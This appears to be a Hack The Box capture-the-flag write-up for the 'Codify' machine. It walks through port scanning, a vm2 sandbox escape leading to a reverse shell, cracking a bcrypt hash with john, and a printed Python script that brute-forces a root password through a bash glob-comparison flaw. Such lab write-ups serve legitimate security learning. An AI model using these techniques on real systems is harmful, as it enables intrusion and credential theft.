---
layout: post
title: Codify (HTB-Easy)
date: 2023-12-18
categories: [Hack The Box]
tags: [Linux, Node.js, bash, john, bruteforce, vm2, mysql]
---

### Box Release Date: November 4, 2023 

## Machine Summary

This is an easy-level box from Hack The Box. Getting a foothold on the box requires you to leverage a vulnerability in the vm2 Node.js module, that allows you to perform a sandbox-escape attack. Getting user access is done through cracking a hash found in the /var/www directory. Finally, getting root is done by bruteforcing credentials from a vulnerable bash script.

## Reconnaissance

I started the box off with a portscan as usual.

```bash
┌──(h0ax㉿kracken)-[~/htb/boxes/easy/codify]
└─$ rustscan -a 10.129.39.118 -b 500 -t 500
[sudo] password for h0ax: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.129.39.118:22
Open 10.129.39.118:80
Open 10.129.39.118:3000
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-19 03:03 UTC
Initiating Ping Scan at 03:03
Scanning 10.129.39.118 [2 ports]
Completed Ping Scan at 03:03, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:03
Completed Parallel DNS resolution of 1 host. at 03:03, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 03:03
Scanning 10.129.39.118 [3 ports]
Discovered open port 22/tcp on 10.129.39.118
Discovered open port 80/tcp on 10.129.39.118
Discovered open port 3000/tcp on 10.129.39.118
Completed Connect Scan at 03:03, 0.28s elapsed (3 total ports)
Nmap scan report for 10.129.39.118
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-12-19 03:03:48 UTC for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

```

I then ran a nmap scan on ports 80 and 3000 using the vuln script along with the service enumeration arg. Nothing of interest was returned from this scan. 

Next I added the IP for the box into my hosts file and then visited the site in a web browser.

## Shell as Joshua

I went to the landing page at http://codify.htb and saw the below site:

![landing-page](/assets/images/machines/htb/codify/codify-landing.png)

I then ran a web directory fuzz scan and found the following subdirectories:

```bash
┌──(h0ax㉿kracken)-[~/htb/boxes/easy/codify]
└─$ feroxbuster -r -k -u http://codify.htb -w ~/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://codify.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/h0ax/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      119l      246w     3123c http://codify.htb/editor
200      GET       61l      199w     2665c http://codify.htb/limitations
200      GET       50l      282w     2921c http://codify.htb/about
200      GET       38l      239w     2269c http://codify.htb/
200      GET      119l      246w     3123c http://codify.htb/Editor
200      GET       50l      282w     2921c http://codify.htb/About
403      GET        9l       28w      275c http://codify.htb/server-status
200      GET       50l      282w     2921c http://codify.htb/ABOUT
[####################] - 62s    30007/30007   0s      found:8       errors:20     
[####################] - 61s    30001/30001   489/s   http://codify.htb/
```

The __about__ page contains information about the software that the site is utilizing. The page talks about how the site uses a specific Node.js module, __vm2__, to allow people to test out their own node.js javascript in a sandboxed environment.

There is a link to a github page mentioning the version info of the __vm2__ module on the about page. This most likely will be a place we should investigate more.

Before I dig into the vulnerabilities for the module version, I went and checked the rest of the endpoints.

The __limitations__ page was not of interest, it just contains allowed methods that you can use. We can reference this later if we have issues getting an exploit to work.

The __editor__ page is what our attack vector will be most likely. I assume that we can place vulnerable javascript here that allows us to get RCE. Since __vm2__ is a javascript sandboxing module, I am betting that we will be performing a sandbox escape attack that allows us to directly give commands to the host.

![editor-js](/assets/images/machines/htb/codify/editor.png)

Returning to the __vm2__ module, I looked up vulnerabilities for the version and found the following hit for a github page, https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244.

This post described a VM sandbox escape for the version we found on the site. The post also had a POC exploit that we can use. I changed out the command to ping my machine and I was able see ICMP traffic going to my tunnel interface from the target.

![rce-ping](/assets/images/machines/htb/codify/rce.png)

```bash
┌──(h0ax㉿kracken)-[~/htb/boxes/easy/codify]
└─$ sudo tcpdump -i tun0                
[sudo] password for h0ax: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:44:04.762628 IP kracken.42832 > codify.htb.http: Flags [S], seq 793659220, win 64240, options [mss 1460,sackOK,TS val 784846468 ecr 0,nop,wscale 7], length 0
21:44:04.848562 IP codify.htb.http > kracken.42832: Flags [S.], seq 1212649948, ack 793659221, win 65160, options [mss 1338,sackOK,TS val 2678119797 ecr 784846468,nop,wscale 7], length 0
21:44:04.848601 IP kracken.42832 > codify.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 784846554 ecr 2678119797], length 0
21:44:04.848877 IP kracken.42832 > codify.htb.http: Flags [P.], seq 1:1025, ack 1, win 502, options [nop,nop,TS val 784846554 ecr 2678119797], length 1024: HTTP: POST /run HTTP/1.1
21:44:05.019764 IP codify.htb.http > kracken.42832: Flags [.], ack 1025, win 502, options [nop,nop,TS val 2678119969 ecr 784846554], length 0
21:44:05.323777 IP codify.htb > kracken: ICMP echo request, id 1, seq 1, length 64
21:44:05.323802 IP kracken > codify.htb: ICMP echo reply, id 1, seq 1, length 64
21:44:06.325144 IP codify.htb > kracken: ICMP echo request, id 1, seq 2, length 64
21:44:06.325165 IP kracken > codify.htb: ICMP echo reply, id 1, seq 2, length 64
21:44:07.326808 IP codify.htb > kracken: ICMP echo request, id 1, seq 3, length 64
21:44:07.326829 IP kracken > codify.htb: ICMP echo reply, id 1, seq 3, length 64
21:44:08.170610 IP kracken.60672 > 239.255.255.250.1900: UDP, length 167
21:44:08.328522 IP codify.htb > kracken: ICMP echo request, id 1, seq 4, length 64
21:44:08.328539 IP kracken > codify.htb: ICMP echo reply, id 1, seq 4, length 64
21:44:09.171455 IP kracken.60672 > 239.255.255.250.1900: UDP, length 167
21:44:09.329859 IP codify.htb > kracken: ICMP echo request, id 1, seq 5, length 64
21:44:09.329878 IP kracken > codify.htb: ICMP echo reply, id 1, seq 5, length 64
21:44:09.425615 IP codify.htb.http > kracken.42832: Flags [P.], seq 1:757, ack 1025, win 502, options [nop,nop,TS val 2678124374 ecr 784846554], length 756: HTTP: HTTP/1.1 200 OK
21:44:09.425641 IP kracken.42832 > codify.htb.http: Flags [.], ack 757, win 501, options [nop,nop,TS val 784851131 ecr 2678124374], length 0
21:44:09.510908 IP codify.htb.http > kracken.42832: Flags [F.], seq 757, ack 1025, win 502, options [nop,nop,TS val 2678124374 ecr 784846554], length 0
21:44:09.511518 IP kracken.42832 > codify.htb.http: Flags [F.], seq 1025, ack 758, win 501, options [nop,nop,TS val 784851217 ecr 2678124374], length 0
21:44:09.597449 IP codify.htb.http > kracken.42832: Flags [.], ack 1026, win 502, options [nop,nop,TS val 2678124546 ecr 784851217], length 0
21:44:10.172482 IP kracken.60672 > 239.255.255.250.1900: UDP, length 167
21:44:11.173999 IP kracken.60672 > 239.255.255.250.1900: UDP, length 167
^C
24 packets captured
24 packets received by filter
0 packets dropped by kernel
```

Now that we confirmed that we can get code execution on the target, let us see if we can get a reverse shell established.

I swapped out the ping command with a bash reverse shell and was able to get reverse shell:

![reverse-shell](/assets/images/machines/htb/codify/reverse-shell.png)

```bash
──(h0ax㉿kracken)-[~/htb/boxes/easy/codify]
└─$ nc-htb
listening on [any] 9999 ...
connect to [10.10.16.2] from (UNKNOWN) [10.129.39.118] 35652
bash: cannot set terminal process group (1242): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@codify:~$
```

Now that we have a shell on the box let's upload linpeas.

After running linpeas, I can see we have another user account. This is the account we need to elevate our privleges to, to get the first flag. I saw a script at __/opt/scripts/mysql-backup.sh__, this looked interesting but I was not able to get any credentials from it. I saw that the box had a mysql instance running on a docker container too. I could not find away to get access to it though.

I then went through the contents of the __/var/www/editor__ directory. Going through the files I was not able to find any credentials or other items of interest. Navigating back to the __/var/www__ directory, there was a directory called __contact/__ that had a file called __tickets.db__. This file actually had hashed credentials for the Joshua user.

```bash
svc@codify:/var/www/contact$ cat tickets.db	
cat tickets.db 
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��	tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO..... (###time to do it yourself!###)
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```

The hash is using the bcrypt algorithm, so we need to specify that as the hashing algorithm in our hashcat command.

I first attempted to decrypt the hash using hashcat, this was taking way too long so I tried cracking the hash with john. Doing so quickly returned a match for the hash.

```bash
┌──(h0ax㉿kracken)-[~/htb/boxes/easy/codify]
└─$ john --wordlist=~/pentestin/wordlists/SecLists/rockyou.txt hash                
Created directory: /home/h0ax/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spon**************       (?)     (hash here!)
1g 0:00:00:46 DONE (2023-12-18 23:47) 0.02146g/s 28.98p/s 28.98c/s 28.98C/s crazy1..eunice
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I then tried to switch to the Joshua user using the credentials and was successful. 

```bash
svc@codify:~$ su joshua
su joshua
Password: spon******

joshua@codify:/home/svc$
joshua@codify:/home/svc$ id
id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
joshua@codify:/home/svc$
joshua@codify:/home/svc$ cd ../joshua
cd ../joshua
joshua@codify:~$ ls -al
ls -al
total 32
drwxrwx--- 3 joshua joshua 4096 Nov  2 12:22 .
drwxr-xr-x 4 joshua joshua 4096 Sep 12 17:10 ..
lrwxrwxrwx 1 root   root      9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 joshua joshua  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 joshua joshua 3771 Apr 21  2023 .bashrc
drwx------ 2 joshua joshua 4096 Sep 14 14:44 .cache
-rw-r--r-- 1 joshua joshua  807 Apr 21  2023 .profile
-rw-r----- 1 root   joshua   33 Dec 19 02:20 user.txt
-rw-r--r-- 1 joshua joshua   39 Sep 14 14:45 .vimrc
joshua@codify:~$ cat user.txt
cat user.txt
a81246a9e5900....................
```

We can get the user flag as well. Now onto root.

## Shell as root

Running __sudo -l__ on the box reveals that we can run that __/opt/scripts/mysql-backup.sh__ script that we saw earlier.

```bash
joshua@codify:/opt/scripts$ sudo -l
sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

I looked at the script again and there is a vulnerability in how the script handles user input. 

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The if statement section of the script contains vulnerable logic, with how it is written an attacker could place an asterisk as input and it will evaluate to true, since the use of __==__ inside __[[ ]]__ in Bash will make the asterisk be treated as a glob character. This means we can crack the mysql script credentials by bruteforcing every character in the password.

I was a bit confused on how to create a script to do this so I look up how to do this online since I am still a beginner with Python. I found a few writeups online from other CTF enthusiats all using the same script. I edited it slightly since the subprocess module was not present on the target for me.

```python
import string
import os

def check_password(p):
	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
	result = os.popen(command).read()
	return "Password confirmed!" in result

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
	for char in charset:
		if check_password(password + char):
			password += char
			break
	else:
		is_password_found = True

		with open("root-pass.txt", "w") as file:
			file.write(password)
```

The script run was successful and I was able to get the root password. I happened to save it to a text file in this instance.

```bash
joshua@codify:~$ cat root-pass.txt 
kljh12k3jha.........
```

We can also now successfully su to the root user!

```bash
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# cd /root
root@codify:~# cat root.txt 
12de91226e8a69dc............
```

# <(^^,)>